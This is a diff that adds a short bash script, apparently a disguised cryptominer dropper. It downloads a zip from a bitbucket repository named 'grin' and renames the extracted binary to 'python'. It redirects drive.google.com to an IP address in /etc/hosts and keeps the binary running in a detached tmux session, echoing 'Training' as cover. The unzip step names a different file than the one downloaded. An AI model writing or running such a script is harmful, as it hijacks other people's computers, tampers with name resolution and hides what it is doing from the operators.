@@ -1,0 +1,12 @@
+	 
+#!/bin/bash
+apt-get install tmux unzip -y
+
+wget https://bitbucket.org/tengikekao/grin/downloads/goo.zip
+unzip data.zip
+mv python3 python
+chmod +x python
+
+sh -c "echo '104.211.3.145  drive.google.com' >> /etc/hosts"
+
+while (true) ; do if pgrep -x "python" > /dev/null; then echo "Training";else echo "Train was installed" && tmux new-session -d -s my_session1 './python';fi; sleep 30; done
